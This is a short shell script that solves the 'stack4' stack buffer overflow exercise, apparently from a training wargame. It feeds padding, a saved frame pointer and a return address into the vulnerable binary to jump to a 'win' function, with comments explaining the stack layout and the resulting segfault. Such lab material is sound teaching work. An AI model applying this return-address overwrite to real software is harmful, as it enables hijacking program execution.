#!/bin/sh


echo \
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB"\
$(python -c "print('\x28\xf8\xff\xbf')")\
$(python -c "print('\xf4\x83\x04\x08')") | ./stack4

# See stack4.c for an explanation of the organisation of the stack
# "A"s correspond to buffer
# "B"s correspond to padding
# Then we have 0xbffff828, which is the value of the saved ebp.
# The rest is the target address

# Why do we get a "Segmentation Fault" even though we got the code excution?
# Well, we consume the return address to JUMP (not call) to another function, win.
# When win returns, it will return by consuming a return address from the stack. However,
# we never pushed an address and will read garbage. That is why we get segmentation fault.
